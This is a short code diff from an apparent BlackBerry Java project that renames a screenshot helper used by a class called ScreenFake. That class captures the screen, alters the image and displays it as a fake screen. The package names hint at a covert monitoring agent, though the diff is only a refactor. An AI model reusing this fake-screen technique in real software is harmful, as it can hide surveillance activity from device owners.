@@ -15,10 +15,10 @@ import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.BitmapField;
 import net.rim.device.api.ui.container.MainScreen;
-import blackberry.agent.SnapShotAgent;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.module.ModuleSnapshot;
 
 public class ScreenFake extends MainScreen {
     //#ifdef DEBUG
@@ -30,7 +30,7 @@ public class ScreenFake extends MainScreen {
     public ScreenFake() {
         super();
 
-        bitmap = SnapShotAgent.getScreenshot();
+        bitmap = ModuleSnapshot.getScreenshot();
         modifyBitmap();
         final BitmapField field = new BitmapField(bitmap);
         add(field);
